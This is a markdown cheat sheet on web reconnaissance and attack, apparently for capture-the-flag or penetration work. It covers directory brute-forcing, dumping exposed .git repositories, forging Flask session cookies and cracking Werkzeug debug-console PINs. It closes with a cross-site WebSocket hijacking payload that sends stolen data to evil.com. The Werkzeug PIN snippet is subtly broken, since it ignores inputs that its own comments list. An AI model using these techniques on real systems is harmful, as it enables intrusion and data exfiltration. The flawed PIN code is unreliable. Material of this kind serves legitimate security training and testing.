# Web Reconnaissance

## Initial Enumeration

```bash
curl -v <url>                                  # headers, status, redirects
curl -s <url> -o /dev/null -D -                # headers only
curl -s <url>/robots.txt                       # disallowed paths
curl -s <url>/sitemap.xml                      # site structure
curl -s <url>/.well-known/                     # standardized metadata
```

## Technology Fingerprinting

| Indicator | Technology |
|---|---|
| `X-Powered-By` header | Framework (Express, PHP, ASP.NET, Flask) |
| `Server` header | Web server (nginx, Apache, gunicorn, Caddy) |
| `PHPSESSID` cookie | PHP |
| `connect.sid` cookie | Express.js (Node.js) |
| `JSESSIONID` cookie | Java (Tomcat, Spring) |
| `csrftoken` / `_csrf` cookie | Django / Express CSRF |
| `.aspx` extensions | ASP.NET |
| `__next` in HTML | Next.js |
| `_app` / `_next/static` paths | Next.js |
| `__reactFiber` in DOM | React |
| `ng-` attributes in HTML | Angular |
| `/wp-admin/`, `/wp-content/` | WordPress |
| `Werkzeug` in error pages | Flask (Python) |
| `X-Request-Id` with UUID | Go / Ruby on Rails |

```bash
whatweb <url>                                   # automated fingerprinting
wappalyzer                                     # browser extension
```

## Directory and File Discovery

```bash
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -t 50
ffuf -u <url>/FUZZ -w <wordlist> -fc 404 -t 50
feroxbuster -u <url> -w <wordlist>
dirsearch -u <url>
```

**High-value targets**:
`/admin`, `/api`, `/debug`, `/console`, `/graphql`, `/swagger`,
`/.git/`, `/.env`, `/.DS_Store`, `/backup`, `/config`,
`/actuator` (Spring Boot), `/__debug__` (Django debug toolbar),
`/server-status` (Apache mod_status), `/elmah.axd` (ASP.NET errors)

## Source Code Review

- View page source: comments, hidden inputs, inline JS, API endpoints.
- JavaScript files: hardcoded keys, API routes, client-side validation logic.
- Source maps (`.map` files): often expose original TypeScript/source.
- `/.git/` exposure: use `git-dumper` to download the repository.

```bash
# Git repository dumper
git-dumper <url>/.git/ ./output
cd output && git log --oneline
```

## API Discovery

- Check for `/api/v1/`, `/api/v2/`, `/graphql`, `/rest/`.
- Look for Swagger/OpenAPI: `/swagger.json`, `/openapi.json`, `/api-docs`.
- GraphQL introspection:
  ```json
  {"query": "{__schema{types{name,fields{name}}}}"}
  ```

## Cookie and Session Analysis

```bash
# Decode Flask session cookie (base64-encoded JSON + signature)
flask-unsign --decode --cookie '<session_cookie>'
flask-unsign --unsign --cookie '<cookie>' --wordlist wordlist.txt
# Forge with known secret:
flask-unsign --sign --cookie "{'admin': True}" --secret 'supersecret'
```

```python
# Decode JWT (see jwt-attacks.md for exploitation)
import base64, json
header, payload, sig = token.split('.')
print(json.loads(base64.urlsafe_b64decode(payload + '==')))
```

## Werkzeug Debug Console
**When**: Flask app in debug mode (`FLASK_DEBUG=1`). `/console` endpoint is accessible.
```bash
# Check: curl http://target/console → interactive Python REPL
# If PIN-protected: PIN is derived from deterministic machine values
# Collect: MAC address, machine-id, cgroup, modname, username, app path
# Then compute PIN with Werkzeug's algorithm:
```
```python
# IN: MAC (from /proc/net/arp or /sys/class/net/eth0/address),
#     machine_id (/etc/machine-id + /proc/self/cgroup first line),
#     modname ("flask.app" or "werkzeug.debug"), appname ("Flask"),
#     mod_path (from /console error or /proc/self/cmdline)
# OUT: PIN string
import hashlib, itertools
mac_int = int("aa:bb:cc:dd:ee:ff".replace(":",""), 16)
machine_id = b"machine-id-here" + b"cgroup-line-here"
# Werkzeug >= 2.1: uses SHA-1; older: MD5
h = hashlib.sha1()
for bit in itertools.chain([b"werkzeug.debug", b"Flask"], [str(mac_int).encode(), machine_id]):
    h.update(bit)
pin = "%09d" % (int(h.hexdigest(), 16) % 1000000000)
```

## WebSocket Hijacking (CSWSH)
**When**: WebSocket endpoint doesn't validate Origin header.
```javascript
// Attacker page opens WebSocket to victim's server
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = () => ws.send('{"action":"get_flag"}');
ws.onmessage = (e) => fetch("https://evil.com/?data="+btoa(e.data));
```
**Trap**: Cookies are sent automatically with WebSocket handshake (like CSRF). If the server only checks session cookies and not Origin, cross-site WebSocket hijacking works.
